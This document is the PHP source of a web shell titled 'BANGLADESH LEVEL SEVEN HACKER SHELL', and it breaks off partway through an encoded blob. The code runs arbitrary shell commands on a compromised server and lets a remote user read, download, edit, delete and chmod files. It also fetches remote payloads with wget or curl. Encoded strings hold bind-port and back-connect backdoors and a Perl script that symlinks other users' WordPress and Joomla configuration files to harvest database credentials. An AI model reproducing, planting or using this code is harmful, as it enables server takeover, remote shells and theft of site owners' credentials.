<?php

# BANGLADESH LEVEL SEVEN HACKER SHELL V1.0 Coded by Sid Gifari 
# BD_LEVEL_7

@ini_set('log_errors',0);
@ini_set('output_buffering',0);
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
    $file = $_GET['dl'];
    $filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: ".strlen($filez));
    header("Content-disposition: attachment; filename=\"".basename($file)."\";");
    echo $filez;
    exit;
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
    $file = $_GET['dlgzip'];
    $filez = gzencode(@file_get_contents($file));
    header("Content-Type:application/x-gzip\n");
    header("Content-length: ".strlen($filez));
    header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
    echo $filez;
    exit;
}
if(isset($_GET['img'])){
    @ob_clean();
    $d = magicboom($_GET['y']);
    $f = $_GET['img'];
    $inf = @getimagesize($d.$f);
    $ext = explode($f,".");
    $ext = $ext[count($ext)-1];
    @header("Content-type: ".$inf["mime"]);
    @header("Cache-control: public");
    @header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
    @header("Cache-control: max-age=".(60*60*24*7));
    @readfile($d.$f);
    exit;
}
$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
$system = @php_uname();
function showstat($stat) {if ($stat=="on") {return "<b><font style='color: #4633ff'>ON</font></b>";}else {return "<b><font style='color:#DD4736'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE;
if(isset($_GET['y'])){
    if(@is_dir($_GET['view'])){
        $pwd = $_GET['view'];
        @chdir($pwd);
    }
    else{
        $pwd = $_GET['y'];
        @chdir($pwd);
    }
}
function convertByte($s) {
    if($s >= 1073741824)
        return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
        return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
        return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
        return $s .' B';
}
if(!$win){
    if(!$user = rapih(exe("whoami"))) $user = "";
    if(!$id = rapih(exe("id"))) $id = "";
    $prompt = $user." \$ ";
    $pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user." &gt;";
    $pwd = realpath(".")."\\";
    $v = explode("\\",$d);
    $v = $v[0];
    foreach (range("A","Z") as $letter)
    {
        $bool = @is_dir($letter.":\\");
        if ($bool)
        {
            $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
            if ($letter.":" != $v) {$letters .= $letter;}
            else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
            $letters .= " ]</a> ";
        }
    }
}

function testoracle() {
    if (function_exists('ocilogon')) { return showstat("on"); }
    else { return showstat("off"); }
}

function testmssql() {
    if (function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
}
function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
}
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$bindport = "13123";
$bindport_pass = "cconroll";
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++){
    $pathz = "";
    for($j = 0 ; $j <= $i ; $j++){
        $pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
    }
    $pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}

// rename file or folder
if(isset($_POST['rename'])){
    $old = $_POST['oldname'];
    $new = $_POST['newname'];
    @rename($pwd.$old,$pwd.$new);
    $file = $pwd.$new;
}
if(isset($_POST['chmod'])){
    $name = $_POST['name'];
    $value = $_POST['newvalue'];
    if (strlen($value)==3){
        $value = 0 . "" . $value;}
    @chmod($pwd.$name,octdec($value));
    $file = $pwd.$name;}

if(isset($_POST['chmod_folder'])){
    $name = $_POST['name'];
    $value = $_POST['newvalue'];
    if (strlen($value)==3){
        $value = 0 . "" . $value;}
    @chmod($pwd.$name,octdec($value));
    $file = $pwd.$name;}
// print useful info
$buff  = "Software : <b>".$software."</b><br />";
$buff .= "System OS : <b>".$system."</b><br />";
if($id != "") $buff .= "ID : <b>".$id."</b><br />";
$buff .= "PHP Version : <b>".phpversion()."</b> on <b>".php_sapi_name()."</b><br />";
$buff .= "Server ip : <b><font color= \"red\">".$server_ip."</b> </font><span class=\"gaya\"> | </span> Your   ip : <b>".$my_ip."</b><span class=\"gaya\"> | </span> Admin : <b>".$admin_id."</b><br />";
$buff .= "Free Disk: "."<span style='color:#00FF1E'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
if($safemode) $buff .= "Safemode: <span class=\"gaya\"><b>ON</b></span><br />";
else $buff .= "Safemode: <span class=\"gaya\"><b>OFF</b></span><br />";
$buff .= "Disabled Functions: ".showdisablefunctions()."<br />";
$buff .= "MySQL: ".testmysql()."&nbsp;|&nbsp;MSSQL: ".testmssql()."&nbsp;|&nbsp;Oracle: ".testoracle()."&nbsp;|&nbsp;Perl: ".testperl()."&nbsp;|&nbsp;cURL: ".testcurl()."&nbsp;|&nbsp;WGet: ".testwget()."<br>";
$buff .= "<font color=00ff00 ><b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font><hr>";
function rapih($text){
    return trim(str_replace("<br />","",$text));
}

function magicboom($text){
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}

function showdir($pwd,$prompt){
    $fname = array();
    $dname = array();
    if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
    else $posix = FALSE;
    $user = "????:????";
    if($dh = @scandir($pwd)){
        foreach($dh as $file){
            if(is_dir($file)){
                $dname[] = $file;
            }
            elseif(is_file($file)){
                $fname[] = $file;
            }
        }
    }
    else{
        if($dh = @opendir($pwd)){
            while($file = @readdir($dh)){
                if(@is_dir($file)){
                    $dname[] = $file;
                }
                elseif(@is_file($file)){
                    $fname[] = $file;
                }
            }
            @closedir($dh);
        }
    }


    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR,$pwd);
    $tree = @sizeof($path);
    $parent = "";
    $buff = "
	<center><form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
	<tr><td><b>view file/folder</b></td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" /><input class=\"inputzbut\" type=\"submit\" value=\"View !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form></table><table class=\"explore\">
	<tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr></center>
	";
    if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
    else $parent = $pwd;

    foreach($dname as $folder){
        if($folder == ".") {
            if(!$win && $posix){
                $name=@posix_getpwuid(@fileowner($folder));
                $group=@posix_getgrgid(@filegroup($folder));
                $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
            }
            else {
                $owner = $user;
            }
            $buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td><td><center>".get_perms($pwd)."</center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form></td>
			
			</tr>
			";
        }
        elseif($folder == "..") {
            if(!$win && $posix){
                $name=@posix_getpwuid(@fileowner($folder));
                $group=@posix_getgrgid(@filegroup($folder));
                $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
            }
            else {
                $owner = $user;
            }
            $buff .= "<tr><td><a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'>   $folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td>
			<td><center>".get_perms($parent)."</center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			</td></tr>";
        }
        else {
            if(!$win && $posix){
                $name=@posix_getpwuid(@fileowner($folder));
                $group=@posix_getgrgid(@filegroup($folder));
                $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
            }
            else {
                $owner = $user;
            }
            $buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />     [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">".$owner."</td>
			<td><center>
			<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
			<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td><td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a></td></tr>";
        }
    }

    foreach($fname as $file){
        $full = $pwd.$file;
        if(!$win && $posix){
            $name=@posix_getpwuid(@fileowner($folder));
            $group=@posix_getgrgid(@filegroup($folder));
            $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
        }
        else {
            $owner = $user;
        }
        $buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
		</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
		<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
		<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
    }
    $buff .= "</table>";
    return $buff;
}
function ukuran($file){
    if($size = @filesize($file)){
        if($size <= 1024) return $size;
        else{
            if($size <= 1024*1024) {
                $size = @round($size / 1024,2);;
                return "$size kb";
            }
            else {
                $size = @round($size / 1024 / 1024,2);
                return "$size mb";
            }
        }
    }
    else return "???";
}

function exe($cmd){
    if(function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }
    elseif(function_exists('exec')) {
        @exec($cmd,$results);
        $buff = "";
        foreach($results as $result){
            $buff .= $result;
        }
        return $buff;
    }
    elseif(function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }
    elseif(function_exists('shell_exec')){
        $buff = @shell_exec($cmd);
        return $buff;
    }
}

function tulis($file,$text){
    $textz = gzinflate(base64_decode($text));
    if($filez = @fopen($file,"w"))
    {
        @fputs($filez,$textz);
        @fclose($file);
    }
}

function ambil($link,$file) {
    if($fp = @fopen($link,"r")){
        while(!feof($fp)) {
            $cont.= @fread($fp,1024);
        }
        @fclose($fp);
        $fp2 = @fopen($file,"w");
        @fwrite($fp2,$cont);
        @fclose($fp2);
    }
}

function which($pr){
    $path = exe("which $pr");
    if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
    $namafile = basename($url);
    switch($cmd) {
        case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
        case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
        case 'wfread' : ambil($wurl,$namafile);break;
        case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
        case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
        case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
        case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
        default: break;
    }
    return $namafile;
}

function get_perms($file)
{
    if($mode=@fileperms($file)){
        $perms='';
        $perms .= ($mode & 00400) ? 'r' : '-';
        $perms .= ($mode & 00200) ? 'w' : '-';
        $perms .= ($mode & 00100) ? 'x' : '-';
        $perms .= ($mode & 00040) ? 'r' : '-';
        $perms .= ($mode & 00020) ? 'w' : '-';
        $perms .= ($mode & 00010) ? 'x' : '-';
        $perms .= ($mode & 00004) ? 'r' : '-';
        $perms .= ($mode & 00002) ? 'w' : '-';
        $perms .= ($mode & 00001) ? 'x' : '-';
        return $perms;
    }
    else return "??????????";
}

function clearspace($text){
    return str_replace(" ","_",$text);
}
// net tools
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
//confshell
//contolsmucok
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPlByaXY4IFNDUjwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IHRhaG9tYSwgdmVyZGFuYSwgQXJpYWw7DQogZm9udC1zaXplOiBtZWRpdW07DQogY29sb3I6ICNGRkZGRkY7DQogYmFja2dyb3VuZC1jb2xvcjogIzY2NjY2NjsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQoka29sYT0kbXNyLiIvIi4kdXNlcjsNCiRrb2xhPX5zL1xuLy9nOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYSAtIGhvbWUudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcyAtIHdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywka29sYS4nLSBDIE0gRiAudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGtvbGEuJy0gQyBNIEYgLSBmb3J1bS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLy